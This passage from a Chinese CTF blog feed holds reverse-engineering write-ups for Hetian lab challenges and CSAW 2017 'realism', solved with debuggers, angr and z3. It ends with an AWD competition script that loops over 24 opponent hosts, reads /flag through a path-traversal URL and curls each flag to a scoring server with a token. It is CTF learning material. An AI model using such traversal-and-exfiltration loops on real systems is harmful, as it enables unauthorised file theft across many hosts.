int(num)    return index, symbol, numdef cal(index, symbol, num):    if symbol == &#39;+&#39;:        enc[index] = (enc[index] - num) % 256    elif symbol == &#39;-&#39;:        enc[index] = (enc[index] + num) % 256    elif symbol == &#39;^&#39;:        enc[index] = (enc[index] ^ num) % 256    else:        print &#39;error&#39;for op in ops:    index, symbol, num = getPart(op)    # print &#39;enc[&#39;, index, &#39;]&#39;, symbol, num    cal(index, symbol, num)flag = &#39;&#39;for i in range(len(enc)):    flag += chr(enc[i])print flag</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>re</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>合天网安实验室-逆向部分</title>
    <link href="/2018/11/06/%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C%E5%AE%A4-%E9%80%86%E5%90%91%E9%83%A8%E5%88%86/"/>
    <url>/2018/11/06/%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C%E5%AE%A4-%E9%80%86%E5%90%91%E9%83%A8%E5%88%86/</url>
    
    <content type="html"><![CDATA[<p>把<a href="http://www.hetianlab.com/CTFrace.html" target="_blank" rel="noopener">合天网安实验室</a>的逆向做了一遍。</p><a id="more"></a><h1 id="逆向-100"><a href="#逆向-100" class="headerlink" title="逆向 100"></a>逆向 100</h1><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>看你的咯，移动安全大神(逆向 100, 已解决 534)</p><p>题目描述: dex2jar 是我们的好朋友<br>相关附件: rev100.zip</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><pre><code class="bash">$ file rev100rev100: Zip archive data, at least v2.0 to extract</code></pre><p>可以判断出其实给的文件是个 apk，根据提示用 dex2jar 可以做。我这里用 jadx 反编译：</p><pre><code class="java">package ctf.crackme;import android.app.Activity;import android.os.Bundle;import android.view.Menu;import android.view.MenuItem;import android.widget.TextView;public class FlagActivity extends Activity {    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_flag);        String flag = &quot;&quot;;        int[] d = new int[]{102, 108, 97, 103, 123, 119, 52, 110, 110, 52, 95, 106, 52, 114, 95, 109, 121, 95, 100, 51, 120, 125};        for (int i = 0; i &lt; 22; i++) {            flag = flag.concat(String.valueOf((char) d[i]));        }        ((TextView) findViewById(R.id.flagText)).setText(flag);    }    public boolean onCreateOptionsMenu(Menu menu) {        getMenuInflater().inflate(R.menu.flag, menu);        return true;    }    public boolean onOptionsItemSelected(MenuItem item) {        if (item.getItemId() == R.id.action_settings) {            return true;        }        return super.onOptionsItemSelected(item);    }}</code></pre><p>直接把数组 d 的值转字符就完事了：</p><pre><code class="python">#!/usr/bin/env pythonenc = [102, 108, 97, 103, 123, 119, 52, 110, 110, 52, 95, 106, 52, 114, 95, 109, 121, 95, 100, 51, 120, 125]flag = &#39;&#39;for i in range(len(enc)):    flag += chr(enc[i])print flag# flag{w4nn4_j4r_my_d3x}</code></pre><h1 id="逆向-200"><a href="#逆向-200" class="headerlink" title="逆向 200"></a>逆向 200</h1><h2 id="Description-1"><a href="#Description-1" class="headerlink" title="Description"></a>Description</h2><p>做题累了玩个游戏吧(逆向 200, 已解决 309)</p><p>题目描述: pwd1_pwd2<br>相关附件: rev200.exe</p><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><pre><code class="bash">$ file rev200.exerev200.exe: PE32 executable (console) Intel 80386 (stripped to external PDB), for MS Windows</code></pre><p>程序加了 tls，但对逆向没有什么影响。直接上 OD 调：</p><pre><code>00401B33  |.  83EC 08       sub esp,0x800401B36  |.  A1 8CAD4000   mov eax,dword ptr ds:[0x40AD8C]          ; ||||00401B3B  |.  890424        mov dword ptr ss:[esp],eax               ; ||||00401B3E  |.  E8 4D5F0000   call &lt;jmp.&amp;msvcrt.puts&gt;                  ; |||\puts00401B43  |.  8D85 A9FEFFFF lea eax,dword ptr ss:[ebp-0x157]         ; |||00401B49  |.  894424 04     mov dword ptr ss:[esp+0x4],eax           ; |||00401B4D  |.  C70424 209040&gt;mov dword ptr ss:[esp],re200_no.00409020 ; |||ASCII &quot;%20s&quot;00401B54  |.  E8 2F5F0000   call &lt;jmp.&amp;msvcrt.scanf&gt;                 ; ||\scanf00401B59  |.  8D85 BDFEFFFF lea eax,dword ptr ss:[ebp-0x143]         ; ||00401B5F  |.  894424 04     mov dword ptr ss:[esp+0x4],eax           ; ||00401B63  |.  8D85 A9FEFFFF lea eax,dword ptr ss:[ebp-0x157]         ; ||00401B69  |.  890424        mov dword ptr ss:[esp],eax               ; ||00401B6C  |.  E8 275F0000   call &lt;jmp.&amp;msvcrt.strcmp&gt;                ; |\strcmp00401B71  |.  85C0          test eax,eax                             ; |00401B73  |.  75 18         jnz short re200_no.00401B8D              ; |00401B75  |.  C70424 269140&gt;mov dword ptr ss:[esp],re200_no.00409126 ; |ASCII &quot;You passed level1!&quot;00401B7C  |.  E8 0F5F0000   call &lt;jmp.&amp;msvcrt.puts&gt;                  ; \puts00401B81  |.  C70424 000000&gt;mov dword ptr ss:[esp],0x000401B88  |.  E8 5DFAFFFF   call re200_no.004015EA00401B8D  |&gt;  B8 00000000   mov eax,0x000401B92  |.  8D65 F8       lea esp,[local.2]00401B95  |.  59            pop ecx                                  ;  msvcrt.77558E6200401B96  |.  5B            pop ebx00401B97  |.  5D            pop ebp00401B98  |.  8D61 FC       lea esp,dword ptr ds:[ecx-0x4]00401B9B  \.  C3            retn</code></pre><p>第一个 check 很容易找到 passwd：</p><pre><code>堆栈地址=0028FD75, (ASCII &quot;r0b0RUlez!&quot;)eax=00000001</code></pre><p>第二个 check 有个 <code>int3</code> 反调试：</p><pre><code>004015EA  /$  55            push ebp004015EB  |.  89E5          mov ebp,esp004015ED  |.  83EC 18       sub esp,0x18004015F0  |.  837D 08 09    cmp [arg.1],0x9004015F4  |.  7F 11         jg short re200_no.00401607004015F6  |.  8345 08 01    add [arg.1],0x1004015FA  |.  8B45 08       mov eax,[arg.1]004015FD  |.  890424        mov dword ptr ss:[esp],eax               ;  re200_no.0040161900401600  |.  E8 E5FFFFFF   call re200_no.004015EA00401605  |.  EB 1E         jmp short re200_no.0040162500401607  |&gt;  A1 90AD4000   mov eax,dword ptr ds:[0x40AD90]          ; |0040160C  |.  890424        mov dword ptr ss:[esp],eax               ; |re200_no.004016190040160F  |.  E8 7C640000   call &lt;jmp.&amp;msvcrt.puts&gt;                  ; \puts00401614  |.  E8 00000000   call re200_no.0040161900401619  |$  58            pop eax                                  ;  0028FDD50040161A  |.  A3 A8AD4000   mov dword ptr ds:[0x40ADA8],eax          ;  re200_no.004016190040161F  |.  CC            int300401620  |.  B8 00000000   mov eax,0x000401625  |&gt;  C9            leave00401626  \.  C3            retn</code></pre><p>新增的 <code>AddVectoredExceptionHandler</code> 这个 API 将一个指向函数的指针作为参数，把这个函数的地址添加到已注册的异常处理程序链表中。那么这里的 <code>int 3</code> 异常会交给异常处理程序链表中第一个处理函数处理，假如调试器处理这个异常，我们就到不了那里了，所以 OD 的设置一定要忽略所有异常，让程序或系统自己处理。</p><pre><code>00401B0E  |.  83EC 04       sub esp,0x400401B11  |.  895C24 04     mov dword ptr ss:[esp+0x4],ebx                        ; |00401B15  |.  890424        mov dword ptr ss:[esp],eax                            ; |re200_no.0040161900401B18  |.  A1 60B14000   mov eax,dword ptr ds:[&lt;&amp;KERNEL32.GetProcAddress&gt;]     ; |00401B1D  |.  FFD0          call eax                                              ; \GetProcAddress00401B1F  |.  83EC 08       sub esp,0x800401B22  |.  C74424 04 7F1&gt;mov dword ptr ss:[esp+0x4],re200_no.0040157F00401B2A  |.  C70424 010000&gt;mov dword ptr ss:[esp],0x100401B31  |.  FFD0          call eax                                              ;  re200_no.0040161900401B33  |.  83EC 08       sub esp,0x800401B36  |.  A1 8CAD4000   mov eax,dword ptr ds:[0x40AD8C]                       ; ||||00401B3B  |.  890424        mov dword ptr ss:[esp],eax                            ; ||||re200_no.0040161900401B3E  |.  E8 4D5F0000   call &lt;jmp.&amp;msvcrt.puts&gt;                               ; |||\puts</code></pre><p>重新调试一遍，可以在 <code>1AF9</code> 处看到程序将 <code>AddVectoredExceptionHandler</code> 的地址（<code>DS:0x40ADAC</code> 存放的是字符串 <code>AddVectoredExceptionHandler</code>）从 <code>kernel32.dll</code> 中取出，并且将 <code>0040157F</code> 函数注册到了这个地方：</p><pre><code>00401AF9  |.  8B1D ACAD4000 MOV EBX,DWORD PTR DS:[0x40ADAC]                       ; |00401AFF  |.  A1 9CAD4000   MOV EAX,DWORD PTR DS:[0x40AD9C]                       ; |00401B04  |.  890424        MOV DWORD PTR SS:[ESP],EAX                            ; |00401B07  |.  A1 5CB14000   MOV EAX,DWORD PTR DS:[&lt;&amp;KERNEL32.GetModuleHandleA&gt;]   ; |00401B0C  |.  FFD0          CALL EAX                                              ; \GetModuleHandleA00401B0E  |.  83EC 04       SUB ESP,0x400401B11  |.  895C24 04     MOV DWORD PTR SS:[ESP+0x4],EBX                        ; |00401B15  |.  890424        MOV DWORD PTR SS:[ESP],EAX                            ; |00401B18  |.  A1 60B14000   MOV EAX,DWORD PTR DS:[&lt;&amp;KERNEL32.GetProcAddress&gt;]     ; |00401B1D  |.  FFD0          CALL EAX                                              ; \GetProcAddress00401B1F  |.  83EC 08       SUB ESP,0x800401B22  |.  C74424 04 7F1&gt;MOV DWORD PTR SS:[ESP+0x4],rev200.0040157F00401B2A  |.  C70424 010000&gt;MOV DWORD PTR SS:[ESP],0x100401B31  |.  FFD0          CALL EAX</code></pre><p>找到 <code>157F</code> 处，删除分析后就能看到代码：</p><pre><code>0040157F    55              push ebp00401580    89E5            mov ebp,esp00401582    83EC 38         sub esp,0x3800401585    8B45 08         mov eax,dword ptr ss:[ebp+0x8]00401588    8B40 04         mov eax,dword ptr ds:[eax+0x4]           ; ntdll_12.77DF9D4C0040158B    8B80 B8000000   mov eax,dword ptr ds:[eax+0xB8]00401591    8945 F4         mov dword ptr ss:[ebp-0xC],eax00401594    8B45 F4         mov eax,dword ptr ss:[ebp-0xC]           ; re200_no.0040902000401597    8B15 A8AD4000   mov edx,dword ptr ds:[0x40ADA8]          ; re200_no.004016190040159D    83C2 06         add edx,0x6004015A0    39D0            cmp eax,edx                              ; msvcrt._iob004015A2    75 38           jnz short re200_no.004015DC004015A4    8D45 E0         lea eax,dword ptr ss:[ebp-0x20]004015A7    894424 04       mov dword ptr ss:[esp+0x4],eax004015AB    C70424 20904000 mov dword ptr ss:[esp],re200_no.00409020 ; ASCII &quot;%20s&quot;004015B2    E8 D1640000     call &lt;jmp.&amp;msvcrt.scanf&gt;004015B7    A1 98AD4000     mov eax,dword ptr ds:[0x40AD98]004015BC    894424 04       mov dword ptr ss:[esp+0x4],eax004015C0    8D45 E0         lea eax,dword ptr ss:[ebp-0x20]004015C3    890424          mov dword ptr ss:[esp],eax004015C6    E8 7CFFFFFF     call re200_no.00401547</code></pre><p>在 <code>1547</code> 处，可以看到是对内存中长度为 8 的一串数据与 2 进行了异或：</p><pre><code>00401547    55              push ebp00401548    89E5            mov ebp,esp0040154A    EB 22           jmp short re200_no.0040156E0040154C    8B45 08         mov eax,dword ptr ss:[ebp+0x8]0040154F    0FB610          movzx edx,byte ptr ds:[eax]00401552    8B45 0C         mov eax,dword ptr ss:[ebp+0xC]00401555    0FB600          movzx eax,byte ptr ds:[eax]00401558    83F0 02         xor eax,0x20040155B    38C2            cmp dl,al0040155D    74 07           je short re200_no.004015660040155F    B8 01000000     mov eax,0x100401564    EB 17           jmp short re200_no.0040157D00401566    8345 08 01      add dword ptr ss:[ebp+0x8],0x10040156A    8345 0C 01      add dword ptr ss:[ebp+0xC],0x10040156E    8B45 0C         mov eax,dword ptr ss:[ebp+0xC]00401571    0FB600          movzx eax,byte ptr ds:[eax]00401574    3C 02           cmp al,0x200401576  ^ 75 D4           jnz short re200_no.0040154C00401578    B8 00000000     mov eax,0x00040157D    5D              pop ebp                                  ; re200_no.004015CB0040157E    C3              retn</code></pre><p>在堆栈部分可以看到存储的地址：</p><pre><code>0028F62C  /0028F66C0028F630  |004015CB  返回到 re200_no.004015CB 来自 re200_no.004015470028F634  |0028F64C  输入字符串地址0028F638  |0028FDCC  用来比较的字符串的地址0028F63C  |000000000028F640  |000000000028F644  |000000000028F648  |00000000</code></pre><p>在数据窗口跟随得到数据：</p><pre><code>0028FDCC  75 31 6E 6E 66 32 6C 67 02 50 6C 65 61 73 65 20  u1nnf2lgPlease0028FDDC  65 6E 74 65 72 20 74 68 65 20 73 65 63 6F 6E 64  enter the second</code></pre><p>写个脚本逆出结果：</p><pre><code class="python">#!/usr/bin/env pythonenc = [0x75, 0x31, 0x6E, 0x6E, 0x66, 0x32, 0x6C, 0x67, 0x02]res = &#39;&#39;for i in range(len(enc)):    res += chr(enc[i] ^ 0x02)print res# w3lld0ne</code></pre><h1 id="逆向-300"><a href="#逆向-300" class="headerlink" title="逆向 300"></a>逆向 300</h1><h2 id="Description-2"><a href="#Description-2" class="headerlink" title="Description"></a>Description</h2><p>ELF(逆向 300, 已解决 139)</p><p>题目描述: 靠,我这儿也没有 IDA 啊<br>相关附件: rev300.zip</p><h2 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h2><pre><code>$ file rev300rev300: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=a93ffe39302e19ef5184a1d86b720b11a7a97941, stripped</code></pre><p>总共有两个 check：</p><pre><code class="cpp">int __cdecl main(int a1, char **a2){  if ( a1 &gt; 1 &amp;&amp; sub_8048414(a2[1], 0) )  {    puts(&quot;Access granted&quot;);    sub_8048538((int)a2[1]);  }  else  {    puts(&quot;Access denied&quot;);  }  return 0;}</code></pre><p>第一个是对程序参数的的一个比较，一个递归的函数：</p><pre><code class="cpp">signed int __cdecl sub_8048414(_BYTE *a1, int a2){  signed int result; // eax  switch ( a2 )  {    case 0:      if ( *a1 == &#39;i&#39; )        goto LABEL_19;      result = 0;      break;    case 1:      if ( *a1 == &#39;e&#39; )        goto LABEL_19;      result = 0;      break;    case 3:      if ( *a1 == &#39;n&#39; )        goto LABEL_19;      result = 0;      break;    case 4:      if ( *a1 == &#39;d&#39; )        goto LABEL_19;      result = 0;      break;    case 5:      if ( *a1 == &#39;a&#39; )        goto LABEL_19;      result = 0;      break;    case 6:      if ( *a1 == &#39;g&#39; )        goto LABEL_19;      result = 0;      break;    case 7:      if ( *a1 == &#39;s&#39; )        goto LABEL_19;      result = 0;      break;    case 9:      if ( *a1 == &#39;r&#39; )LABEL_19:        result = sub_8048414(a1 + 1, 7 * (a2 + 1) % 11);      else        result = 0;      break;    default:      result = 1;      break;  }  return result;}</code></pre><p>第二个是把正确的输入和内存中的数据进行异或：</p><pre><code class="cpp">int __cdecl sub_8048538(int a1){  int v2[33]; // [esp+18h] [ebp-A0h]  int i; // [esp+9Ch] [ebp-1Ch]  qmemcpy(v2, &amp;unk_8048760, sizeof(v2));  for ( i = 0; i &lt;= 32; ++i )    putchar(v2[i] ^ *(char *)(a1 + i % 8));  return putchar(10);}</code></pre><p>脚本如下：</p><pre><code class="python">#!/usr/bin/env pythonenc = [0x0000000F, 0x0000001F, 0x00000004, 0x00000009, 0x0000001C, 0x00000012, 0x00000042, 0x00000009, 0x0000000C, 0x00000044, 0x0000000D, 0x00000007, 0x00000009, 0x00000006, 0x0000002D, 0x00000037, 0x00000059, 0x0000001E, 0x00000000, 0x00000059, 0x0000000F, 0x00000008, 0x0000001C, 0x00000023, 0x00000036, 0x00000007, 0x00000055, 0x00000002, 0x0000000C, 0x00000008, 0x00000041, 0x0000000A, 0x00000014]key = &#39;&#39;i = 0for j in range(8):    if i == 0:        key += &#39;i&#39;    if i == 1:        key += &#39;e&#39;    if i == 3:        key += &#39;n&#39;    if i == 4:        key += &#39;d&#39;    if i == 5:        key += &#39;a&#39;    if i == 6:        key += &#39;g&#39;    if i == 7:        key += &#39;s&#39;    if i == 9:        key += &#39;r&#39;    i = 7 * (i + 1) % 11print keyflag = &#39;&#39;for i in range(len(enc)):    flag += chr(enc[i] ^ ord(key[i % 8]))print flag</code></pre><p>对参数的求解也可以用 angr 来完成：</p><pre><code class="python">#!/usr/bin/env pythonimport angrimport claripyp = angr.Project(&#39;./rev300&#39;)flag = claripy.BVS(&#39;flag&#39;, 50 * 8)state = p.factory.entry_state(args=[&#39;./rev300&#39;, flag])sim = p.factory.simgr(state)sim.explore(find=0x080485E0, avoid=0x080485FE)print(sim.found[0].solver.eval(flag, cast_to=bytes))</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=530793" target="_blank" rel="noopener">https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=530793</a><br><a href="https://blog.csdn.net/xiangshangbashaonian/article/details/82953042" target="_blank" rel="noopener">https://blog.csdn.net/xiangshangbashaonian/article/details/82953042</a><br><a href="https://docs.microsoft.com/en-us/windows/win32/debug/using-a-vectored-exception-handler" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/win32/debug/using-a-vectored-exception-handler</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>re</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2017-CSAW-Quals-realism</title>
    <link href="/2018/08/30/2017-CSAW-Quals-realism/"/>
    <url>/2018/08/30/2017-CSAW-Quals-realism/</url>
    
    <content type="html"><![CDATA[<p>学习 z3 时复现的一道题，了解了 SSE 指令以及学习了 gdb 和 qemu 之间的调试。</p><a id="more"></a><h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><pre><code class="bash">$ file main.binmain.bin: DOS/MBR boot sector</code></pre><p>题目给的是一个 DOS 程序，直接拖进 IDA，以 16 位的模式打开。定位到一处检测字符串前缀的代码，基本可以判断出 1234h 即我们输入的字符串在内存中的地址。</p><pre><code>seg000:006F                 cmp     dword ptr ds:1234h, &#39;galf&#39;seg000:0078                 jnz     loc_14Dseg000:007C                 movaps  xmm0, xmmword ptr ds:1238hseg000:0081                 movaps  xmm5, xmmword ptr ds:7C00hseg000:0086                 pshufd  xmm0, xmm0, 1Eh</code></pre><p>因为 IDA 不能反编译，所以基本上是直接看汇编，那么需要稍微了解一下 <a href="https://www.jianshu.com/p/64ef4d304e17" target="_blank" rel="noopener">SSE 指令</a>。</p><table><thead><tr><th style="text-align:center">指令</th><th style="text-align:center">作用</th></tr></thead><tbody><tr><td style="text-align:center"><code>MOVAPS</code></td><td style="text-align:center">把源存储器内容值送入目的寄存器。当有 m128 时, 内存地址必须是 16 字节对齐的。</td></tr><tr><td style="text-align:center"><code>PSHUFD</code></td><td style="text-align:center">有三个操作数，从左往右，第一个操作数是目的操作数保存结果，第二个操作数是源操作数，第三个操作数是一个 8 位立即数，指定以怎样的顺序将源操作数中数据保存到目的操作数。</td></tr><tr><td style="text-align:center"><code>ANDPS</code></td><td style="text-align:center">按位与</td></tr><tr><td style="text-align:center"><code>PSADBW</code></td><td style="text-align:center">绝对差值求和</td></tr></tbody></table><p>接下来的汇编部分有一些小复杂，动态调试会比较清晰。先用 qemu 启动程序（-s 参数开启远程调试服务）：</p><pre><code class="bash">qemu-system-i386 -drive format=raw,file=main.bin -s</code></pre><p>gdb 进行远程连接，并设置指令架构，同时在比较完 flag 前缀后设下断点（MBR 的加载地址是 0x7C00）：</p><pre><code class="bash">gdb -ex &#39;target remote localhost:1234&#39; \    -ex &#39;set architecture i8086&#39; \    -ex &#39;break *0x7c6f&#39; \    -ex &#39;continue&#39;</code></pre><p>然后在程序中输入字符串，以 flag 为前缀，后面的部分用 a 到 p 来填充：</p><p><img src="/pics/2017-CSAW-Quals-realism/1.png" srcset="/img/loading.gif" alt></p><p>输入完成后我们可以看到 gdb 断了下来，此时可以开始和 IDA 对照着调试。可能是因为指令的结构不一样，所以 gdb 中只有当前指向的指令是基本正确的（有时可能也不正确，还是要看 IDA 的汇编）。同时在每次对 xmm 寄存器操作后，可以使用 p 命令输出并查看寄存器中的值。</p><p><img src="/pics/2017-CSAW-Quals-realism/2.png" srcset="/img/loading.gif" alt></p><p>首先单步调一下，看看两条 movaps 指令：</p><pre><code>seg000:007C                 movaps  xmm0, xmmword ptr ds:1238hseg000:0081                 movaps  xmm5, xmmword ptr ds:7C00h</code></pre><p>单步后可以看到 xmm0 中存放了我们输入的字符串中 flag 之后的部分（我是在 mac 下调试的，gdb 中可能有点 bug，寄存器存的值明显偏了 32 位）。接着执行下一条指令，可以看出 xmm5 中存放了内存中另一段的数据，可以打印出来看看：</p><pre><code>gef&gt; p $xmm5$6 = {  v4_float = {-2.50091934, -1.48039995e-36, 1.93815862e-18, 0},  v2_double = {-1.787847107871084e-289, 2.8231360405480285e-315},  v16_int8 = {0x10, 0xf, 0x20, 0xc0, 0x83, 0xe0, 0xfb, 0x83, 0xc8, 0x2, 0xf, 0x22, 0x0, 0x0, 0x0, 0x0},  v8_int16 = {0xf10, 0xc020, 0xe083, 0x83fb, 0x2c8, 0x220f, 0x0, 0x0},  v4_int32 = {0xc0200f10, 0x83fbe083, 0x220f02c8, 0x0},  v2_int64 = {0x83fbe083c0200f10, 0x220f02c8},  uint128 = 0x220f02c883fbe083c0200f10}gef&gt; p $xmm4$7 = {  v4_float = {0, 0, 0, -134298496},  v2_double = {0, -8.2671312985563202e+62},  v16_int8 = {0x0 &lt;repeats 12 times&gt;, 0xb8, 0x13, 0x0, 0xcd},  v8_int16 = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x13b8, 0xcd00},  v4_int32 = {0x0, 0x0, 0x0, 0xcd0013b8},  v2_int64 = {0x0, 0xcd0013b800000000},  uint128 = 0xcd0013b8000000000000000000000000}</code></pre><pre><code>seg000:0086                 pshufd  xmm0, xmm0, 1Ehseg000:008B                 mov     si, 8</code></pre><p>接下来单步执行 pshufd 这条指令。不关注 pshufd 的具体作用的话，可以在调试中看到，运行过后发现 xmm0 中的值从 0x706f6e6d6c6b6a696867666564636261 变成了 0x6463626168676665706f6e6d6c6b6a69，数据的顺序变化了。然后将 si 置为 8，在后面的调试中可以判断出，si 中存放的为循环次数。</p><pre><code>seg000:008E                 movaps  xmm2, xmm0seg000:0091                 andps   xmm2, xmmword ptr [si+7D90h]</code></pre><p>接下来两条指令分别将 xmm0 赋给 xmm2 以及将 xmm2 和内存中的一段数据按位与。看一看到 xmm2 中的值即为变化后的输入：</p><pre><code>gef&gt; p $xmm2$2 = {  v4_float = {2.96401656e+29, 4.37102201e+24, 1.67779994e+22, 0},  v2_double = {8.5408834851248547e+194, 8.3212257841951935e-315},  v16_int8 = {0x6d, 0x6e, 0x6f, 0x70, 0x65, 0x66, 0x67, 0x68, 0x61, 0x62, 0x63, 0x64, 0x0, 0x0, 0x0, 0x0},  v8_int16 = {0x6e6d, 0x706f, 0x6665, 0x6867, 0x6261, 0x6463, 0x0, 0x0},  v4_int32 = {0x706f6e6d, 0x68676665, 0x64636261, 0x0},  v2_int64 = {0x68676665706f6e6d, 0x64636261},  uint128 = 0x6463626168676665706f6e6d}gef&gt; p $xmm1$3 = {  v4_float = {0, 0, 0, 1.1384003e+27},  v2_double = {0, 1.8458895617341177e+214},  v16_int8 = {0x0 &lt;repeats 12 times&gt;, 0x69, 0x6a, 0x6b, 0x6c},  v8_int16 = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6a69, 0x6c6b},  v4_int32 = {0x0, 0x0, 0x0, 0x6c6b6a69},  v2_int64 = {0x0, 0x6c6b6a6900000000},  uint128 = 0x6c6b6a69000000000000000000000000}</code></pre><p>查看内存中的数据，可以看到和输入按位与之后，会把对应为 0x00 两个字节给抹掉。并通过下面的分析可以知道总共会有 8 次循环，每次进行按位与的数据是不同的，即每次的数据会左移 4 位：</p><pre><code>gef&gt; x/2gx 0x7D980x7d98:    0xffffffffffffff00    0xffffffffffffff00gef&gt; x/2gx 0x7D970x7d97:    0xffffffffffff00ff    0xffffffffffff00ffgef&gt; x/2gx 0x7D960x7d96:    0xffffffffff00ffff    0xffffffffff00ffffgef&gt; x/2gx 0x7D950x7d95:    0xffffffff00ffffff    0xffffffff00ffffffgef&gt; x/2gx 0x7D940x7d94:    0xffffff00ffffffff    0xffffff00ffffffffgef&gt; x/2gx 0x7D930x7d93:    0xffff00ffffffffff    0xffff00ffffffffffgef&gt; x/2gx 0x7D920x7d92:    0xff00ffffffffffff    0xff00ffffffffffffgef&gt; x/2gx 0x7D910x7d91:    0x00ffffffffffffff    0x00ffffffffffffff</code></pre><p>接着看 psadbw 这条指令，这里将 xmm5 和 xmm2 中的数据进行绝对差值求和（每 64 位的数据逐字节相减，将结果相加后存到前一个操作数中）。接着把高低 64 位经过绝对差值求和的结果（每个结果大小为 16 位，高低两个结果共 32 位）保存到 edi 中：</p><pre><code>seg000:0096                 psadbw  xmm5, xmm2seg000:009A                 movaps  xmmword ptr ds:1268h, xmm5seg000:009F                 mov     di, ds:1268hseg000:00A3                 shl     edi, 10hseg000:00A7                 mov     di, ds:1270h</code></pre><p>然后将 edi 中的结果和内存里的值比较，如果不相等，会有个大跳转，IDA 里大概判断一下应该是直接跳到失败处。</p><pre><code>seg000:00AB                 mov     dx, siseg000:00AD                 dec     dxseg000:00AE                 add     dx, dxseg000:00B0                 add     dx, dxseg000:00B2                 cmp     edi, [edx+7DA8h]seg000:00BA                 jnz     loc_14Dseg000:00BE                 dec     siseg000:00BF                 test    si, siseg000:00C1                 jnz     short sub_8E</code></pre><p>查看内存中进行比较的值，正好 8 个值，每次都进行一次判断：</p><pre><code>gef&gt; x/8wx 0x7DA80x7da8:    0x02110270    0x02290255    0x025e0291    0x01f902330x7db8:    0x027b0278    0x02090221    0x0290025d    0x02df028f</code></pre><p>基本上所有的线性关系都有了，接下来交给 z3 就行了。</p><h1 id="Script"><a href="#Script" class="headerlink" title="Script"></a>Script</h1><pre><code class="python">#!/usr/bin/env pythonfrom z3 import *def z3_abs(x):    return If(x &gt;= 0, x, -x)def psadbw(xmm0, xmm1):    a = Sum([z3_abs(b1 - b2) for b1, b2 in zip(xmm0[:8], xmm1[:8])])    b = Sum([z3_abs(b1 - b2) for b1, b2 in zip(xmm0[8:], xmm1[8:])])    return a + b * 0x10000s = Solver()ZERO = IntVal(0)xmm5 = &#39;220f02c883fbe083c0200f10cd0013b8&#39;.decode(&#39;hex&#39;)xmm5 = [ord(c) for c in xmm5]xmm5s = [xmm5]xmm0 = [Int(&#39;x%d&#39; % i) for i in range(16)]for c in xmm0:    s.add(c &gt;= 32, c &lt;= 126)check = [0x02df028f, 0x0290025d, 0x02090221, 0x027b0278, 0x01f90233, 0x025e0291, 0x02290255, 0x02110270]xmm5s += map(lambda e: [0, 0, 0, 0, 0, 0, (e &gt;&gt; 8) &amp; 0xFF, e &amp; 0xFF, 0, 0, 0, 0, 0, 0, e &gt;&gt; 24, (e &gt;&gt; 16) &amp; 0xFF], check)print xmm5sfor i in range(8):    xmm5 = xmm5s[i]    xmm2 = list(xmm0)    xmm2[7 - i] = ZERO    xmm2[15 - i] = ZERO    res = psadbw(xmm5, xmm2)    s.add(res == check[i])if s.check() == sat:    print s.model()    flag = &#39;&#39;.join(chr(eval(str(s.model()[c]))) for c in xmm0)    # pshufd xmm0, xmm0, 1Eh    flag = &#39;flag&#39; + flag[:4][::-1] + flag[4:8][::-1] + flag[12:][::-1] + flag[8:12][::-1]    print flag    # flag{4r3alz_m0d3_y0}</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://fortenf.org/e/ctfs/re/2017/09/18/csaw17-realism.html" target="_blank" rel="noopener">https://fortenf.org/e/ctfs/re/2017/09/18/csaw17-realism.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>re</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2018-XMan结营赛</title>
    <link href="/2018/08/22/2018-XMan%E7%BB%93%E8%90%A5%E8%B5%9B/"/>
    <url>/2018/08/22/2018-XMan%E7%BB%93%E8%90%A5%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<p>记录一下被虐的经历。</p><a id="more"></a><p>全队就我一个菜鸡维护二进制，全场被痛打，很难受。记录一下线下 AWD 所需要做的准备，以及两道 pwn 的复现。</p><h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p>第一次打 AWD，什么也不懂。</p><ol><li>比赛前了解比赛赛制、环境。</li><li>服务器上线之后，第一时间改密码。</li><li>下载好 <code>FileZilla</code>、<code>Xshell</code> 等连接服务器的工具，把服务器上给的文件备份。</li><li>提前准备好自动化的脚本。</li></ol><p>这里放一下队友 web 大佬的打全场脚本：</p><pre><code class="python">from requests import getfrom os import systemfor i in range(24):    if i == 12:        continue    print(f&quot;======{i+1} starts=======&quot;)    url = f&quot;http://172.16.{i+1}.101:20001/uploads/images/../../../../../../../flag&quot;    try:        flag = get(url).text[:-1]        system(f&#39;curl http://172.16.200.20:9000/submit_flag/ -d &quot;flag={flag}&amp;token=Hn4JuwQQ7Mfaek2HAuTkB3S6k4e38EKXQJEdtDDWDfsda2tqQUgUHRCtrtxbS9hMkQndVbVfHsD&quot;&#39;)        print(f&quot;\n{flag}&quot;)    except:        print(f&quot;{i+1} : no&quot;)        pass    url = 